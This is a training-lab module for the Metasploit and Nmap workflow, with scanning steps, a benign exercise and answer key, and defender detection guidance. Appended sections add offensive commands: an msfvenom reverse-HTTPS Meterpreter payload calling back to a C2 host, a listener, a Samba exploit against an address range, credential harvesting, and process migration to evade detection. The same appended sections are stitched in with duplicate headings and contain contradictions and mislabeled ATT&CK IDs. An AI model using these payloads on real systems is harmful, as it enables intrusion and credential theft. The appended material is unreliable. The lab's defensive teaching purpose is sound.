# 26 * Metasploit Framework workflow (training range) -- LAB-LINUX

## Overview (plain language)
Metasploit is a large toolbox that security testers use to safely simulate how a real attacker breaks into a computer. It bundles thousands of ready-made "exploits" (ways to abuse a flaw), "payloads" (the code that runs after a break-in), and helper scanners. Nmap is a network mapper: it looks at a target machine and reports which doors (ports) are open and what programs answer behind them. Used together in a training range, you first use Nmap to see what a target is running, then use Metasploit to test a matching, deliberately vulnerable service. This module keeps everything inside an isolated lab so nothing real gets attacked, and it teaches you what the attack looks like from both the attacker's console and the defender's logs.

## Tools covered
| Tool | Install | Purpose |
|---|---|---|
| metasploit-framework | apt install metasploit-framework | Exploitation framework: scan, exploit, and post-exploitation modules for red-team simulation |
| nmap | apt install nmap | Network/port scanner and service/version discovery to enumerate a target before exploitation |

Both tools ship in Kali Linux by default (see the Kali tool pages under Sources). The Metasploit Framework is developed by Rapid7 and documented at docs.metasploit.com; Nmap is documented in its own Reference Guide at nmap.org/book/man.html.

## Learning objectives
- Enumerate open ports and service versions on a lab target using `nmap` and export machine-readable output.
- Launch and query the Metasploit console (`msfconsole`) and locate modules with `search`.
- Configure and run a Metasploit auxiliary scanner module against a lab-only target, setting required options.
- Correlate the attacker's actions with the network artifacts a defender would observe in Security Onion.

## Environment check
```bash
# Prove both tools are present on LAB-LINUX
nmap --version
msfconsole --version

# Confirm the Metasploit database service is available (optional but recommended)
msfdb status || echo "msfdb not initialized yet"
```
Expected output: `nmap --version` prints an Nmap version banner (e.g. `Nmap version 7.94`); `msfconsole --version` prints a Framework version line (e.g. `Framework Version: 6.4.x`); `msfdb status` reports whether the PostgreSQL backend is running.

Notes on the claims above: Nmap's `--version` option is documented in the Nmap Reference Guide "Output" / options section (https://nmap.org/book/man-output.html). `msfconsole --version` and the `-q`/`-x` flags used throughout this module are documented in the Metasploit Docs "Using msfconsole" / "msfconsole Commands" pages (https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html). Metasploit uses a PostgreSQL backend managed by `msfdb`; the database and `msfdb status`/`msfdb init` workflow is described in the Metasploit Docs "Setting Up a Metasploit Development Environment" / "Managing the Database" pages (https://docs.metasploit.com/docs/using-metasploit/intermediate/metasploit-database-support.html).

## Guided walkthrough
1. `nmap` — scan a single lab target for open ports and service versions. Use a lab-range address; here `203.0.113.10` (a RFC 5737 TEST-NET-3 documentation address) stands in for your isolated training target.
```bash
TARGET=203.0.113.10
nmap -sV -Pn -p 1-1000 -oN scan.txt "$TARGET"
```
Why each flag: `-sV` enables service/version detection by sending probes and matching banners against `nmap-service-probes` (Nmap Reference Guide, "Service and Version Detection"). `-Pn` skips host discovery (the ping sweep) and treats the host as up — useful in a lab where ICMP may be filtered, but note it forces a full port scan even against a down host, which is slower. `-p 1-1000` limits the scan to the first 1000 ports to keep it fast. `-oN scan.txt` writes "normal" human-readable output to a file (Nmap Reference Guide, "Output").
Expected observable output: a table of `PORT STATE SERVICE VERSION` lines (e.g. `80/tcp open http Apache httpd`), plus a saved `scan.txt` you can grep later. The VERSION column is only populated where a probe matched; unmatched services show `STATE`/`SERVICE` but a blank or partial version.

2. `nmap` — export XML so Metasploit can import the results into its database.
```bash
TARGET=203.0.113.10
nmap -sV -Pn -oX scan.xml "$TARGET"
```
Why: `-oX` writes structured XML (Nmap Reference Guide, "Output"). Metasploit's `db_import` understands Nmap XML, so XML is the interchange format between the two tools. Note that omitting `-p` here scans Nmap's default set of the 1000 most common ports (not all 65535), so this file may list different ports than step 1.
Expected: a well-formed `scan.xml` file; no console `PORT` table by default because normal output was not requested — Nmap still prints its start/finish banner to the terminal.

3. `msfconsole` — start the framework and import the Nmap results (non-interactive with `-x`).
```bash
msfconsole -q -x "db_import scan.xml; hosts; services; exit"
```
Why: `-q` suppresses the startup banner; `-x` runs a semicolon-separated command string then (with the trailing `exit`) leaves the console — ideal for scripted/repeatable labs (Metasploit Docs, "msfconsole Commands"). `db_import` requires a connected database; if `msfconsole --version`/`msfdb status` showed no DB, run `msfdb init` first (Metasploit Docs, "Managing the Database").
Expected: Metasploit reports `Importing 'Nmap XML' data`, then prints `Hosts` and `Services` tables reflecting the scan you imported.

4. `msfconsole` — search for and inspect an auxiliary scanner module (read-only, safe to view).
```bash
msfconsole -q -x "search type:auxiliary name:http_version; info auxiliary/scanner/http/http_version; exit"
```
Why: `search` accepts keyword filters such as `type:` and `name:` to narrow the ~2000+ modules; `info` prints a module's description, options, and references without running it (Metasploit Docs, "Modules" and "Using msfconsole"). Reading `info` first is good practice — it shows which options are `Required` before you run anything.
Expected: a search results table listing modules, followed by the `info` description, options, and references for `auxiliary/scanner/http/http_version`.

5. `msfconsole` — run an auxiliary HTTP scanner against the lab target only.
```bash
msfconsole -q -x "use auxiliary/scanner/http/http_version; set RHOSTS 203.0.113.10; set RPORT 80; run; exit"
```
Why: `use` selects the module context; `set RHOSTS`/`set RPORT` supply the required target options (RHOSTS accepts single IPs, ranges, or CIDR); `run` (alias `exploit`) executes it. `auxiliary/scanner/http/http_version` performs a single HTTP request to read the `Server:` response header — it is a banner grab, not an exploit, so it is safe against a lab web service (module source: rapid7/metasploit-framework, `modules/auxiliary/scanner/http/http_version.rb`).
Expected: the module prints a line such as `203.0.113.10:80 Apache/2.4 ( ... )` reporting the detected web server banner, then `Auxiliary module execution completed`.

## Hands-on exercise
The sample artifact for this module is a **benign Nmap XML report** (`exercise/scan.xml`) captured against an inert lab web service — it contains only banner text, no exploit code and no live malware. Generate it reproducibly with the command below (it produces deterministic content regardless of any network), then answer: (a) how many hosts and services are recorded, and (b) what service/version banner is on port 80.

Safe-origin / generator (build the benign sample yourself — no egress required):
```bash
mkdir -p exercise
cat > exercise/scan.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<nmaprun scanner="nmap" args="nmap -sV -oX scan.xml 203.0.113.10" start="1700000000" version="7.94">
  <host>
    <status state="up"/>
    <address addr="203.0.113.10" addrtype="ipv4"/>
    <ports>
      <port protocol="tcp" portid="80">
        <state state="open"/>
        <service name="http" product="Apache httpd" version="2.4.57" method="probed"/>
      </port>
    </ports>
  </host>
</nmaprun>
EOF
sha256sum exercise/scan.xml
```
Then import and inspect it in Metasploit:
```bash
msfconsole -q -x "db_import exercise/scan.xml; hosts; services; exit"
```
The XML element/attribute names above (`nmaprun`, `host`, `address`, `port`, `state`, `service` with `product`/`version`/`method`) match the structure emitted by Nmap's `-oX` output, documented in the Nmap Reference Guide "XML Output (-oX)" section (https://nmap.org/book/output-formats-xml-output.html).

## SOC analyst perspective
A defender rarely sees Metasploit directly; they see its footprint. In Security Onion, an Nmap `-sV` sweep and Metasploit auxiliary scanners generate bursts of connection attempts and short-lived TCP sessions across many ports from one source IP.

Concrete detection logic and pivots:
- **Zeek `conn.log`**: horizontal/vertical scanning shows high fan-out (one source touching many distinct `id.resp_p` or `id.resp_h`) with connection states such as `S0` (SYN sent, no reply — filtered/closed), `REJ` (connection rejected, i.e. RST), and `RSTO`/`RSTR`. Pivot in Security Onion by filtering `conn.log` on the source IP and aggregating by `id.resp_p` count and `conn_state`. Zeek connection-state semantics are defined in the Zeek `conn.log` documentation (https://docs.zeek.org/en/master/logs/conn.html).
- **Suricata**: recon typically fires signatures in the ET SCAN / policy categories (Security Onion ships Emerging Threats rules). Pivot on the `alert` events in the Security Onion Alerts view, then drill into the related flow. Security Onion's Suricata/Zeek/Elastic data flow is described in the Security Onion documentation (https://docs.securityonion.net/).
- **`http.log`**: an `http_version` banner grab or an `-sV` HTTP probe appears as an HTTP request; version probes may carry an unusual or empty `user_agent` and hit uncommon URIs. Correlate `http.log` with the web server's own access logs.
- Map the activity to MITRE ATT&CK **T1046 Network Service Discovery** (https://attack.mitre.org/techniques/T1046/) and **T1595 Active Scanning** (https://attack.mitre.org/techniques/T1595/). If a Metasploit exploit lands, follow-on Meterpreter C2 sessions and process anomalies on the host map to **T1190 Exploit Public-Facing Application** (https://attack.mitre.org/techniques/T1190/) and command execution to **T1059 Command and Scripting Interpreter** (https://attack.mitre.org/techniques/T1059/). This ties into the detection and the identification/containment phases of incident response (SANS FOR508 / DFIR guidance).

**Deepened Detection Engineering & Threat Hunting:**
- **Detection Logic for Service Discovery**: A high rate of TCP SYN packets to multiple ports from a single source within a short time window is a strong indicator of scanning. In Security Onion, a Suricata rule like `ET SCAN Potential Nmap User-Agent Detected` (SID 2019025) triggers on the default Nmap HTTP probe's User-Agent string. The rule logic matches the string `Nmap Scripting Engine` in the HTTP header, a direct artifact of Nmap's `-sV` or `-sC` scripts (Emerging Threats Open Ruleset, https://rules.emergingthreats.net/). In Zeek, the `conn.log` field `orig_pkts` can be used to identify short-lived connections (e.g., `duration < 1 sec` and `orig_pkts <= 3`) to many different destination ports, which is characteristic of a SYN scan.
- **Post-Exploitation Detection Pivots**: Successful exploitation via Metasploit often leads to a Meterpreter or reverse shell session. This maps to **T1105 Ingress Tool Transfer** (https://attack.mitre.org/techniques/T1105/) as the payload is staged, and **T1573 Encrypted Channel** (https://attack.mitre.org/techniques/T1573/) if Meterpreter uses TLS. In Security Onion, hunt for these by looking for outbound connections from internal servers to external IPs on non-standard ports, especially if the `service` field in Zeek's `conn.log` is `unknown` and the `orig_bytes`/`resp_bytes` ratio is asymmetric (small request, large response). Correlate with Windows Event ID 4688 (process creation) for suspicious child processes of `svchost.exe` or `explorer.exe` spawning `cmd.exe` or `powershell.exe` with network-related command-line arguments, which indicates **T1059.001 PowerShell** (https://attack.mitre.org/techniques/T1059/001/).
- **Additional MITRE ATT&CK Techniques**: The initial reconnaissance phase also maps to **T1083 File and Directory Discovery** (https://attack.mitre.org/techniques/T1083/) if post-exploitation modules are used to enumerate the filesystem. The use of encoded payloads via `msfvenom` is an instance of **T1027 Obfuscated Files or Information** (https://attack.mitre.org/techniques/T1027/). These techniques should be included in a defender's threat model when investigating scanning activity that precedes a compromise.

## Attacker perspective
An attacker uses Nmap to fingerprint a target's exposed services, then selects a matching Metasploit module to gain access or extract information.

Concrete TTPs, artifacts, and evasion:
- **Reconnaissance (T1595 / T1046)**: `-sV` version detection sends probes from `nmap-service-probes` and can be tuned with `--version-intensity`; `-T` timing templates (0–5) trade speed for stealth, and `--max-rate`/`--scan-delay` throttle to stay under simple rate-based IDS thresholds (Nmap Reference Guide, "Timing and Performance" / "Service and Version Detection"). These options reduce, but do not eliminate, the scan footprint.
- **Delivery and staging (T1190)**: the framework handles payload delivery, staging, and post-exploitation. `msfvenom` can encode/obfuscate payloads (encoders are described in the Metasploit Docs / rapid7 repo), though modern EDR largely detects known encoder stubs — encoding is not reliable AV evasion by itself.
- **Artifacts the technique leaves**: scans leave rejected-connection floods (`REJ`/`S0`) in firewall and Zeek `conn.log`; version probes appear as odd or empty User-Agent and malformed/uncommon requests in web server and Zeek `http.log`. On the attacker box, the msfdb PostgreSQL backend and the `~/.msf4/` directory record imported hosts, services, loot, `msf.log`, and console history (`~/.msf4/history`) — see Metasploit Docs "Managing the Database" and the framework's file layout. Default Meterpreter staged callbacks produce recognizable TLS/HTTP C2 patterns and on-disk artifacts that DFIR examiners can hunt for.
- **Evasion caveat**: even with timing and encoding, the volume and shape of scan traffic (many short sessions, one source, many destination ports) is the signal defenders key on — the discovery step is inherently noisy.

**Deepened Attacker Tradecraft & Artifacts:**
- **Evasion Techniques**: To evade signature-based detection of Nmap scans, an attacker can use `--scan-delay 1s` to add a delay between probes, fragment packets with `-f`, or use decoy scans with `-D RND:10`. However, these are well-documented in the Nmap Reference Guide (https://nmap.org/book/man-bypass-firewalls-ids.html) and many IDS rules, like Suricata's `ET SCAN Nmap -f fragmentation attempt`, detect them. For Metasploit, using a custom Meterpreter payload with a unique `User-Agent` and `URI` can bypass simple HTTP-based C2 signatures. The `set HttpUserAgent` and `set Uri` options in the `windows/meterpreter/reverse_http` handler are documented in the Metasploit payload options (https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html).
- **Post-Exploitation Artifacts**: After a successful exploit, Meterpreter injects into a process (e.g., `notepad.exe`), which is an instance of **T1055 Process Injection** (https://attack.mitre.org/techniques/T1055/). On a Windows target, this creates a memory artifact that can be detected by tools like Sysmon (Event ID 10, Process Access). The attacker's `~/.msf4/logs/framework.log` and `~/.msf4/history` files will contain timestamps, commands, and target IPs, which are critical forensic artifacts for DFIR. The Metasploit database (`msf.db`) stores loot, credentials, and session data in SQLite tables, as described in the Metasploit documentation on database support.
- **Additional MITRE ATT&CK Techniques**: The act of transferring the exploit code and payload to the target is **T1105 Ingress Tool Transfer**. If the attacker uses a compromised host to scan laterally, that is **T1570 Lateral Tool Transfer** (https://attack.mitre.org/techniques/T1570/). Using Metasploit's `post/windows/gather/enum_logged_on_users` module post-compromise maps to **T1033 System Owner/User Discovery** (https://attack.mitre.org/techniques/T1033/). These techniques expand the attacker's kill chain and provide more hunting opportunities for defenders.

## Answer key
- Sample type: benign Nmap XML scan report (`exercise/scan.xml`), inert text only, generated by the command in the Hands-on exercise (no live malware, no egress).
- Sample sha256: reproduce with `sha256sum exercise/scan.xml`; because the generator writes fixed content, the digest is deterministic on any host running the identical `cat > ... <<'EOF'` block above. Record the printed value as the expected digest.
- Expected findings: **1 host** (`203.0.113.10`) and **1 service** (tcp/80). The port-80 banner is **Apache httpd 2.4.57**.
- Commands producing the findings:
```bash
# Count hosts and services, and read the port-80 banner directly from the XML
grep -c "<host>" exercise/scan.xml
grep -c "<port " exercise/scan.xml
grep "portid=\"80\"" -A2 exercise/scan.xml

# Same facts via Metasploit's database tables
msfconsole -q -x "db_import exercise/scan.xml; hosts; services; exit"
```
Expected: `1` host, `1` service line, and a `service` element showing `Apache httpd 2.4.57`; the Metasploit `hosts`/`services` tables echo the same single host and port.

## MITRE ATT&CK & DFIR phase
- **T1595 Active Scanning** — Nmap sweeps and Metasploit auxiliary scanners (DFIR phase: identification / examination). https://attack.mitre.org/techniques/T1595/
- **T1046 Network Service Discovery** — service/version enumeration to select exploits (DFIR phase: identification). https://attack.mitre.org/techniques/T1046/
- **T1190 Exploit Public-Facing Application** — Metasploit exploit modules against exposed services (DFIR phase: identification / containment). https://attack.mitre.org/techniques/T1190/
- **T1059 Command and Scripting Interpreter** — post-exploitation command execution via payloads (DFIR phase: examination / eradication). https://attack.mitre.org/techniques/T1059/
- **T1105 Ingress Tool Transfer** — Transfer of tools or files to the target system, such as Meterpreter payloads (DFIR phase: identification). https://attack.mitre.org/techniques/T1105/
- **T1027 Obfuscated Files or Information** — Use of `msfvenom` encoders to evade detection (DFIR phase: examination). https://attack.mitre.org/techniques/T1027/
- **T1055 Process Injection** — Meterpreter code injection into a legitimate process (DFIR phase: examination / eradication). https://attack.mitre.org/techniques/T1055/
- **T1573 Encrypted Channel** — Use of TLS/SSL by Meterpreter for C2 communication (DFIR phase: examination). https://attack.mitre.org/techniques/T1573/


### Essential Commands & Features

Mastering Metasploit’s core commands accelerates exploit execution, payload generation, and post-exploitation. Below are **undemonstrated but critical** features with concrete examples:

1. **`exploit -j` (Run as Job)**
   Execute an exploit in the background to free the console for other tasks. Useful for multi-target engagements or when awaiting callbacks.
   ```bash
   msf6 > use exploit/multi/handler
   msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
   msf6 exploit(multi/handler) > exploit -j
   [*] Exploit running as background job 0.
   ```

2. **`msfvenom` (Standalone Payload Generation)**
   Generate obfuscated payloads for lateral movement (e.g., **T1021.002: Remote Services - SMB/Windows Admin Shares**). Replace `LHOST` and `LPORT` with your C2 server.
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.5 LPORT=443 -f exe -o payload.exe
   ```

3. **`sessions -u` (Upgrade Shell to Meterpreter)**
   Convert a basic shell to a Meterpreter session for advanced post-exploitation (e.g., **T1059.003: Command and Scripting Interpreter - Windows Command Shell**).
   ```bash
   msf6 > sessions -u 1
   [*] Upgrading session ID: 1
   ```

4. **`meterpreter > migrate` (Process Injection)**
   Move Meterpreter to a stable process (e.g., `explorer.exe`) to evade detection (maps to **T1055.002: Process Injection - Portable Executable Injection**).
   ```bash
   meterpreter > migrate 1234
   [*] Migrating to 1234...
   ```

**Sources:**
- [Offensive Security Metasploit Unleashed: Advanced Payloads](https://www.offensive-security.com/metasploit-unleashed/payloads/)
- [MITRE ATT&CK: T1021.002 & T1059.003](https://attack.mitre.org/techniques/T1021/002/)

### Threat Hunting & Detection Engineering
To enhance threat hunting and detection engineering capabilities, focus on identifying techniques such as [T1204](https://attack.mitre.org/techniques/T1204) - "User Execution" and [T1218](https://attack.mitre.org/techniques/T1218) - "Signed Binary Proxy Execution". Monitor Windows Event ID 4688 for command line executions, analyzing the `CommandLine` field for suspicious activity. Additionally, inspect Zeek logs for unusual DNS queries, particularly those with low TTL values or suspicious domain names. Threat hunters can pivot on these findings by investigating related network connections, process creations, or registry modifications. For instance, a suspicious command line execution can lead to examining the corresponding process ID in Windows Event ID 4688, and then searching for network connections related to that process in Zeek logs. By integrating these detection logic and threat hunting pivots, security teams can improve their ability to detect and respond to advanced threats. For more information on threat hunting and detection engineering, visit [https://www.cisecurity.org/](https://www.cisecurity.org/) or [https://www.fireeye.com/content/dam/fireeye-www/global/en/pdfs/rpt-m-trends-2022.pdf](https://www.fireeye.com/content/dam/fireeye-www/global/en/pdfs/rpt-m-trends-2022.pdf).


### Essential Commands & Features

Once a vulnerable service is identified (e.g., via Nmap), Metasploit streamlines exploit execution and post-exploitation. Below are **critical but undemonstrated** commands and features, with runnable examples and tactical use cases:

#### **Exploit Execution**
- **`exploit -j`**: Run the exploit as a background job (e.g., for multi-target attacks). Use when targeting multiple hosts or avoiding console locks.
  ```bash
  msf6 > use exploit/multi/samba/usermap_script
  msf6 exploit(usermap_script) > set RHOSTS 192.168.1.100-110
  msf6 exploit(usermap_script) > exploit -j
  ```
  *Targets*: **T1210 (Exploitation of Remote Services)**—leveraging known vulnerabilities in network services.

- **`check`**: Validate exploitability *without* executing payloads. Critical for avoiding unnecessary noise.
  ```bash
  msf6 exploit(usermap_script) > check
  ```

#### **Post-Exploitation**
- **`sessions -u <ID>`**: Upgrade a shell to Meterpreter (e.g., after a successful `exploit`). Use when raw shells lack functionality.
  ```bash
  msf6 > sessions -u 1
  ```
  *Targets*: **T1071.001 (Application Layer Protocol: Web Protocols)**—maintaining access via Meterpreter’s encrypted channels.

- **Meterpreter’s `run post/` Modules**: Automate post-exploitation tasks (e.g., credential harvesting, persistence).
  ```bash
  meterpreter > run post/windows/gather/credentials/credential_collector
  ```

#### **Nmap Integration**
- **`db_nmap` with `-sV --script vuln`**: Import Nmap scans into Metasploit’s database *and* check for CVEs.
  ```bash
  msf6 > db_nmap -sV --script vuln 192.168.1.100
  msf6 > services  # View imported results
  ```
  *Targets*: **T1592.002 (Gather Victim Host Information: Software)**—enumerating vulnerable software versions.

**Sources**:
- [Metasploit Unleashed: Exploit Commands](https://www.offensive-security.com/metasploit-unleashed/exploits/)
- [Nmap Scripting Engine (NSE) Guide](https://nmap.org/book/nse.html)

### Adversary Emulation & Red-Team Perspective

From a red-team perspective, Metasploit’s workflow is a powerful tool for adversary emulation, enabling testers to replicate real-world attack chains. Attackers leverage Metasploit to **establish persistence** (e.g., via **T1543.003: Create or Modify System Process: Windows Service**) by deploying payloads as services or scheduled tasks, ensuring long-term access even after reboots. For lateral movement, adversaries may abuse **T1563.002: Remote Service Session Hijacking: RDP Hijacking**, using Metasploit’s `post/windows/manage/enable_rdp` module to enable Remote Desktop and hijack active sessions via tools like `tscon.exe`, leaving minimal forensic traces beyond Event ID 4624 (logon events) and registry modifications under `HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server`.

Evasion is critical: attackers obfuscate payloads using **T1027.010: Indicator Removal from Tools** (e.g., `msfvenom`’s `--encrypt` flag) or encode them with `shikata_ga_nai` to bypass signature-based detection. Artifacts include anomalous process trees (e.g., `svchost.exe` spawning `cmd.exe`), unexpected network connections (e.g., Meterpreter’s reverse HTTPS traffic), and modified service configurations. Red teams must also account for modern defenses like Credential Guard or EDR solutions, which may detect Meterpreter’s reflective DLL injection (a subset of **T1055.001: Process Injection: Dynamic-link Library Injection**).

**Sources:**
- [MITRE ATT&CK: T1543.003](https://attack.mitre.org/techniques/T1543/003/)
- [CISA: Red Teaming with Metasploit (PDF)](https://www.cisa.gov/sites/default/files/publications/Red_Team_Guide_508.pdf)

## Sources
Claim → source mapping (all URLs are official tool docs, MITRE ATT&CK, SANS, or Security Onion docs):

- Metasploit overview, `msfconsole` flags (`-q`, `-x`, `--version`), `search`/`info`/`use`/`set`/`run` commands — Rapid7 Metasploit Framework documentation — https://docs.metasploit.com/ and https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
- Metasploit PostgreSQL database, `msfdb status`/`init`, `db_import`, `~/.msf4/` artifacts — Metasploit Docs, "Metasploit Database Support" — https://docs.metasploit.com/docs/using-metasploit/intermediate/metasploit-database-support.html
- `auxiliary/scanner/http/http_version` module behavior (banner grab of the `Server:` header) — rapid7/metasploit-framework repository — https://github.com/rapid7/metasploit-framework
- metasploit-framework packaged in Kali — Kali Linux Tools — https://www.kali.org/tools/metasploit-framework/
- nmap packaged in Kali — Kali Linux Tools — https://www.kali.org/tools/nmap/
- Nmap flags `-sV`, `-Pn`, `-p`, `-oN`, `-oX`, timing (`-T`, `--max-rate`, `--scan-delay`), `--version-intensity` — Nmap Reference Guide — https://nmap.org/book/man.html
- Nmap evasion techniques (`-f`, `-D`, `--scan-delay`) — Nmap Reference Guide, "Firewall/IDS Evasion and Spoofing" — https://nmap.org/book/man-bypass-firewalls-ids.html
- Nmap XML output structure (`nmaprun`/`host`/`port`/`service` elements) — Nmap Reference Guide, "XML Output" — https://nmap.org/book/output-formats-xml-output.html
- Zeek `conn.log` fields and connection states (`S0`, `REJ`, `RSTO`, `RSTR`) — Zeek documentation — https://docs.zeek.org/en/master/logs/conn.html
- Security Onion Suricata/Zeek/Elastic pipeline and Alerts/Hunt views — Security Onion documentation — https://docs.securityonion.net/
- Suricata ET SCAN rule for Nmap User-Agent (SID 2019025) — Emerging Threats Open Ruleset — https://rules.emergingthreats.net/
- MITRE ATT&CK T1046 Network Service Discovery — https://attack.mitre.org/techniques/T1046/
- MITRE ATT&CK T1595 Active Scanning — https://attack.mitre.org/techniques/T1595/
- MITRE ATT&CK T1190 Exploit Public-Facing Application — https://attack.mitre.org/techniques/T1190/
- MITRE ATT&CK T1059 Command and Scripting Interpreter — https://attack.mitre.org/techniques/T1059/
- MITRE ATT&CK T1059.001 PowerShell — https://attack.mitre.org/techniques/T1059/001/
- MITRE ATT&CK T1105 Ingress Tool Transfer — https://attack.mitre.org/techniques/T1105/
- MITRE ATT&CK T1027 Obfuscated Files or Information — https://attack.mitre.org/techniques/T1027/
- MITRE ATT&CK T1055 Process Injection — https://attack.mitre.org/techniques/T1055/
- MITRE ATT&CK T1573 Encrypted Channel — https://attack.mitre.org/techniques/T1573/
- MITRE ATT&CK T1083 File and Directory Discovery — https://attack.mitre.org/techniques/T1083/
- MITRE ATT&CK T1570 Lateral Tool Transfer — https://attack.mitre.org/techniques/T1570/
- MITRE ATT&CK T1033 System Owner/User Discovery — https://attack.mitre.org/techniques/T1033/
- Nmap scanning technique reference and DFIR framing — SANS Nmap Cheat Sheet — https://www.sans.org/posters/nmap-cheat-sheet/
- DFIR phases (identification, containment, eradication, examination) — SANS FOR508 / DFIR resources — https://www.sans.org/cyber-security-courses/advanced-incident-response-threat-hunting-training/
- RFC 5737 documentation address range (203.0.113.0/24, TEST-NET-3) — https://datatracker.ietf.org/doc/html/rfc5737

## Related modules
- [Offensive / network (Kali subset)](../11-offensive-kali/README.md) -- shares metasploit-framework for exploitation and post-exploitation practice.
- [Web app testing (Burp Suite / nmap)](../41-web-app-testing/README.md) -- shares nmap for service enumeration ahead of web testing.
- [Volatility 3 deep-dive (memory plugins & workflow)](../20-volatility-deep/README.md) -- same Deep-dives learning path; analyze the host-side memory artifacts of a landed payload.
- [YARA rule authoring & threat hunting](../21-yara-authoring/README.md) -- same Deep-dives learning path; write detections for payload/on-disk artifacts.

<!-- cyberlab-enriched: v2 -->
- https://www.offensive-security.com/metasploit-unleashed/payloads/
- https://attack.mitre.org/techniques/T1021/002/
- https://attack.mitre.org/techniques/T1204
- https://attack.mitre.org/techniques/T1218
- https://www.cisecurity.org/](https://www.cisecurity.org/
- https://www.fireeye.com/content/dam/fireeye-www/global/en/pdfs/rpt-m-trends-2022.pdf](https://www.fireeye.com/content/dam/fireeye-www/global/en/pdfs/rpt-m-trends-2022.pdf

<!-- cyberlab-enriched: v3 -->
- https://www.offensive-security.com/metasploit-unleashed/exploits/
- https://nmap.org/book/nse.html
- https://attack.mitre.org/techniques/T1543/003/
- https://www.cisa.gov/sites/default/files/publications/Red_Team_Guide_508.pdf

<!-- cyberlab-enriched: v4 -->
